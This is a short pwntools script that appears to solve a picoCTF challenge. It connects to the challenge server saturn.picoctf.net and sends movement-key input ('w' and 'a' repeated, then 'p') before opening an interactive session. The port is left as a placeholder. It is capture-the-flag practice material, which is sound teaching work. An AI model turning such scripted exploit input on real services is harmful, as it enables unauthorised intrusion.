from pwn import *

port = [insert port here]
io = remote("saturn.picoctf.net", port)

io.sendline(b"w" * 4)
io.sendline(b"a" * 4)
io.sendline(b"a" * 4)
io.sendline(b"p")

io.interactive()